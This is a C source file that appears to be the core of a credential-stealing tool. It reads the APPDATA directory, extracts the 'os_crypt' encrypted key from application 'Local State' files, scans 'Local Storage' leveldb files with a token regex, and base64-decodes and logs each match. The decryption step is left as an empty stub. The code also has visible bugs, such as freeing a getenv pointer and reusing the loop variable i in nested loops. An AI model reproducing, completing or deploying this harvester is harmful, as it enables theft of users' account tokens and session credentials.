#include <stdio.h>
#include "lib/cjson/cJSON.h"
#include "lib/base64_apache.h"
#include "lib/starburst/starburst.h"
#include "config.h"

int main(void)
{
#ifdef DEBUG
#define DEBUG_DIR "debug"
    char *roaming = malloc(sizeof(DEBUG_DIR));
    sprintf(roaming, "%s", DEBUG_DIR);
#else
    char *local = getenv("LOCALAPPDATA");
    char *roaming = getenv("APPDATA");
#endif // DEBUG
    // sb_log("Local: )%s\n", local);
    sb_log("Roaming: %s\n", roaming);

    sb_cstr_arr_t paths = {0};
    sb_str_arr_t matches = {0};

    for (size_t i = 0; i < LENGTH(roaming_paths); i++)
    {
        size_t path_size = strlen(roaming) + 1 + strlen(roaming_paths[i]) + 1;

        char *path = alloca(path_size);
        assert(path);
        snprintf(path, path_size, "%s%c%s", roaming, SB_M_PATH_SEPARATOR, roaming_paths[i]);

        sb_da_push(&paths, path);
    }
    free(roaming);

    for (size_t i = 0; i < paths.count; i++)
    {
        sb_log("Handling %s\n", paths.items[i]);

        char *local_state_path = alloca(strlen(paths.items[i]) + 1 + strlen(local_state_dir) + 1);
        assert(local_state_path);
        snprintf(local_state_path, strlen(paths.items[i]) + 1 + strlen(local_state_dir) + 1, "%s%c%s", paths.items[i], SB_M_PATH_SEPARATOR, local_state_dir);

        sb_string_t local_state = {0};
        if (sb_fs_read_file_str(local_state_path, &local_state))
        {
            sb_log("Failed to read local state %s\n", local_state_path);
            continue;
        }

        cJSON *root = cJSON_ParseWithLength(local_state.items, local_state.count);
        if (!root)
        {
            sb_log("Failed to parse local state %s\n", local_state_path);
            continue;
        }

        cJSON *os_crypt = cJSON_GetObjectItem(root, "os_crypt");
        if (!os_crypt)
        {
            sb_log("Failed to get os_crypt\n");
            continue;
        }

        cJSON *encrypted_key = cJSON_GetObjectItem(os_crypt, "encrypted_key");
        if (!encrypted_key)
        {
            sb_log("Failed to get encrypted_key\n");
            continue;
        }

        char *encrypted_key_str = encrypted_key->valuestring;
        if (!encrypted_key_str)
        {
            sb_log("Failed to get encrypted_key_str\n");
            continue;
        }

        sb_log("Encrypted key: %s\n", encrypted_key_str);

        char *leveldb_dir = malloc(strlen(paths.items[i]) + 1 + strlen("Local Storage") + 1 + strlen("leveldb") + 1);
        assert(leveldb_dir != NULL);
        snprintf(leveldb_dir, strlen(paths.items[i]) + 1 + strlen("Local Storage") + 1 + strlen("leveldb") + 1, "%s%c%s%c%s", paths.items[i], SB_M_PATH_SEPARATOR, "Local Storage", SB_M_PATH_SEPARATOR, "leveldb");

        sb_fs_entries_t entries = {0};
        if (!sb_fs_ls(leveldb_dir, &entries))
        {
            sb_log("Failed to list leveldb dir %s\n", leveldb_dir);
            free(leveldb_dir);
            continue;
        }

        sb_log("Number of entries in %s: %zu\n", leveldb_dir, entries.count);

        for (size_t i = 0; i < entries.count; i++)
        {
            for (size_t j = 0; j < LENGTH(leveldb_suffixes); j++)
            {
                sb_str_remove_null(&entries.items[i].name);
                if (sb_str_ends_with(&entries.items[i].name, leveldb_suffixes[j]))
                {
                    sb_log("Handling %s\n", entries.items[i].name.items);

                    char *fullpath = malloc(strlen(leveldb_dir) + 1 + entries.items[i].name.count + 1);
                    assert(fullpath);
                    snprintf(fullpath, strlen(leveldb_dir) + 1 + entries.items[i].name.count + 1, "%s%c%s", leveldb_dir, SB_M_PATH_SEPARATOR, entries.items[i].name.items);

                    sb_string_t file = {0};
                    if (sb_fs_read_file_str(fullpath, &file))
                    {
                        sb_log("Failed to read file %s\n", entries.items[i].name.items);
                        free(fullpath);
                        continue;
                    }
                    free(fullpath);

                    for (size_t i = 0; i < file.count; i++)
                    {
                        if (file.items[i] == '\0')
                            file.items[i] = '\n';
                    }

                    if (!sb_re_match(REGEX_TOKEN, file.items, &matches))
                    {
                        sb_log("No match\n");
                        continue;
                    }

                    for (size_t i = 0; i < matches.count; i++)
                    {
                        sb_log("Match: %s\n", matches.items[i].items);

                        char *decoded = malloc((Base64decode_len(matches.items[i].items) + 1) * sizeof(char));
                        Base64decode(decoded, matches.items[i].items);

                        // decrypt token


                        free(decoded);
                        sb_da_free(&matches.items[i]);
                    }

                    sb_da_free(&file);
                }
            }
        }
        free(leveldb_dir);
    }
    sb_da_free(&paths);

    return 0;
}
